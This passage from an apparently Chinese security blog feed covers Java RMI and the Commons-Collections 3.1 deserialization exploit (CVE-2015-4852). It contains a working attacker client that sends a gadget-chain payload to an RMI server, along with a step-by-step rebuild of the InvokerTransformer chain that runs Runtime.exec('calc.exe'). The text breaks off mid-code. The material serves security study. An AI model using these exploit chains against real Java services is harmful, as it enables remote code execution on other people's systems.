class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"you speak"</span> + say);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"your work is "</span> + work);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        UserImpl user = <span class="keyword">new</span> UserImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">"the rmi is running ..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时服务端具有以下特点：</p><ul><li>jdk版本1.7</li><li>使用具有漏洞的Commons-Collections3.1组件</li><li>RMI提供的数据有Object类型（因为攻击payload就是Object类型）</li></ul><p>客户端（攻击者）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> RMI.Server.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        User userClient = (User)Naming.lookup(url);</span><br><span class="line"></span><br><span class="line">        System.out.println(userClient.name(<span class="string">"lala"</span>));</span><br><span class="line">        userClient.say(<span class="string">"world"</span>);</span><br><span class="line">        userClient.dowork(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"lala"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>亲测可弹计算机，完成任意命令执行。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7y6plwx8hj31h218wwq0.jpg" alt="计算器.png"></p><p>其实把RMI服务器当作一个readObject复写点去利用。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://stuff.mit.edu/afs/athena/software/java/java_v1.2.2/distrib/sun4x_56/docs/guide/rmi/getstart.doc.html#7738" target="_blank" rel="noopener">RMI官方文档</a></p><p><a href="https://xz.aliyun.com/t/4711#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711#toc-3</a></p><p>java安全漫谈-04.RMI篇(1)</p><p>java安全漫谈-04.RMI篇(2)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。&lt;/p&gt;
&lt;p&gt;但是发现RMI在f
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-commons-collections</title>
    <link href="http://lalajun.com/2019/09/22/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-commons-collections/"/>
    <id>http://lalajun.com/2019/09/22/java反序列化-commons-collections/</id>
    <published>2019-09-22T06:05:28.000Z</published>
    <updated>2019-09-22T07:04:45.633Z</updated>
    
    <content type="html"><![CDATA[<p>在此文中着重一点点复现推导了commons-collections、jdk1.7的poc的构造，记录了踩得一个个坑。<br>需要结合反射机制一文食用。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在java反射机制一文中，我们发现反射机制中如果输入可控，就可能形成任意函数调用的情况，具有极大的危害。<br>但实际上真的有存在这种情况：这就是commons-collections-3.1 jar包，cve编号：cve-2015-4852<br>在开始之前我们需要重新复习一下反序列化漏洞的攻击流程：</p><ol><li>客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码）</li><li>exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层）</li><li>这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3……</li><li>最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。</li></ol><p>那么以上大概可以分成三个主要部分：</p><ol><li>payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；我把它称为：payload</li><li>反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链)</li><li>readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称…）</li></ol><h2 id="commons-collections-3-1"><a href="#commons-collections-3-1" class="headerlink" title="commons-collections-3.1"></a>commons-collections-3.1</h2><p>首先来看看<a href="http://commons.apache.org/proper/commons-collections/index.html" target="_blank" rel="noopener">commons-collections项目</a>吧<br>官网第一段：</p><blockquote><p>Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。</p></blockquote><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。<br>它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能：</p><blockquote><ul><li>Transforming decorators that alter each object as it is added to the collection</li><li>转化装饰器：修改每一个添加到collection中的object</li></ul></blockquote><p>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。<br><code>org.apache.commons.collections.Transformer</code>这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是在于这个点。</p><p>漏洞复现需要下载3.1版本源码<a href="https://archive.apache.org/dist/commons/collections/" target="_blank" rel="noopener">3.1版本的下载地址</a>,进去寻觅一下源码和jar包都有<br>由于没有找到漏洞版本3.1的api说明，我们可以参考<a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html" target="_blank" rel="noopener">3.2.2的api文档</a></p><h2 id="POC-gt-利用链"><a href="#POC-gt-利用链" class="headerlink" title="POC-&gt;利用链"></a>POC-&gt;利用链</h2><p>我们将通过调试POC得到漏洞利用链的调用栈，顺便介绍一下各个类，再通过分析调用栈的函数，反推出POC来探究其中的利用原理。</p><p>我们先看一下网上的POC代码，如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">commons_collections_3_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>好好看代码的同学肯定会意识到，以上的poc其实只包括我总结三要素的payload和反序列化利用链两者。<br>而关键的readObject复写利用点没有包含在内。事实确实如此。<br>这个poc的复写利用点是<code>sun.reflect.annotation.AnnotationInvocationHandler的readObject()</code>，但是我们先精简代码关注payload和利用链，最后再加上readObject复写点。</p></blockquote><p>调试以上POC，得到两种调用栈：<br><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78ayvj8v1j30yr06jdgi.jpg" alt="调用栈1.png"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78ayzj2sqj30yl06b0te.jpg" alt="调用栈2.png"></p><h3 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h3><p><a href="https://blog.csdn.net/gm371200587/article/details/82108372" target="_blank" rel="noopener">Map.Entry</a>其实就是键值对的数据格式，其setValue函数如下<br><code>AbstracInputCheckedMapDecorator.class</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    value = <span class="keyword">this</span>.parent.checkSetValue(value);<span class="comment">//进入此处</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/TransformedMap.html" target="_blank" rel="noopener">TransformedMap</a>是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。<br><code>TransformedMap.class</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);<span class="comment">//进入此处</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。</p><p><a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/ChainedTransformer.html" target="_blank" rel="noopener"><code>ChainedTransformer.class</code></a>：这里有一个<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">         <span class="comment">//循环进入此处，先进入1次ConstantTransformer.class，再3次InvokerTransformer.class</span></span><br><span class="line">         object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">         <span class="comment">//另外需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> object;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p><code>transform()</code>函数是一个接口函数，在上面的循环中进入了不同的函数。<br>先是1次<a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/ConstantTransformer.html" target="_blank" rel="noopener"><code>ConstantTransformer.class</code></a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再是进入了<a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/InvokerTransformer.html" target="_blank" rel="noopener"><code>InvokerTransformer.class</code></a>，看到这个就会发现有点东西了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//获取input对象的class</span></span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                <span class="comment">//根据iMethodName、iParamTypes选择cls中的一个方法</span></span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="comment">//根据iArgs参数调用这个方法</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>明显的反射机制，可见<strong>InvokerTransformer</strong>就是我们的触发任意代码执行处，我们看看源码中的文件描述：<br>先看看我们需要关注的<code>InvokerTransformer</code>类的描述（在jar包中是找不到描述信息的，可以通过下载<a href="https://www-us.apache.org/dist//commons/collections/" target="_blank" rel="noopener">官方源码</a>得到）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that creates a new object instance by reflection.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> 通过反射机制创建一个新的对象实例的转换器实现</span></span><br></pre></td></tr></table></figure></p><p>我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map.Entry 类型setValue(<span class="string">"foobar"</span>)</span><br><span class="line">=&gt; AbstracInputCheckedMapDecorator.setValue()</span><br><span class="line">=&gt; TransformedMap.checkSetValue()</span><br><span class="line">=&gt; ChainedTransformer.transform(Object object)</span><br><span class="line">    根据数组，先进入 =&gt; ConstantTransformer.transform(Object input)</span><br><span class="line">    再进入 =&gt; InvokerTransformer.transform(Object input)</span><br></pre></td></tr></table></figure><h2 id="重构POC"><a href="#重构POC" class="headerlink" title="重构POC"></a>重构POC</h2><p>首先明确我们的最终目的是为了执行语句<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p><ul><li>Runtime.getRuntime：获取一个Runtime的实例</li><li>exec()：调用实例的exec函数</li></ul><p>因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）：</p><blockquote><p>至于如何构造反射机制的语句，参考另一篇博客java反射机制</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line">.getMethod(<span class="string">"exec"</span>, String.class)</span><br><span class="line">.invoke(</span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))<span class="comment">//此处在获取实例</span></span><br><span class="line">,</span><br><span class="line"><span class="string">"calc.exe"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="第一步-InvokerTransformer"><a href="#第一步-InvokerTransformer" class="headerlink" title="第一步 InvokerTransformer"></a>第一步 InvokerTransformer</h3><p>再回看反射机制触发函数<code>InvokerTransformer</code>类的<code>transform(Object input)</code>（做了简化处理，只留取重点部分）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure></p><p>通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line"><span class="keyword">this</span>.iMethodName=<span class="string">"exec"</span></span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String.class</span><br><span class="line"><span class="keyword">this</span>.iArgs=<span class="string">"calc.exe"</span></span><br></pre></td></tr></table></figure></p><p>那么在<code>InvokerTransformer</code>类源码中我们可以找到赋值this.iMethodName,this.iParamTypes,this.iArgs的构造函数:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们就可以构建以下测试代码直接调用InvokerTransformer通过反射执行任意命令：<br>下面开始试一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">            <span class="string">"exec"</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//构造input</span></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    <span class="comment">//执行</span></span><br><span class="line">    a.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78azcuhh3j31nb0jfn1d.jpg" alt="反射机制执行任意命令.png"></p><h3 id="在第二步之前"><a href="#在第二步之前" class="headerlink" title="在第二步之前"></a>在第二步之前</h3><p>弹出了计算器！好像很厉害的样子！然后我们来模拟一下利用场景：</p><ul><li>为了方便，攻击者受害者写在同一函数中</li><li>使用文件写入，代替网络传输</li></ul><blockquote><p>由于InvokerTransformer继承了Serializable类，是可以成功序列化的</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span 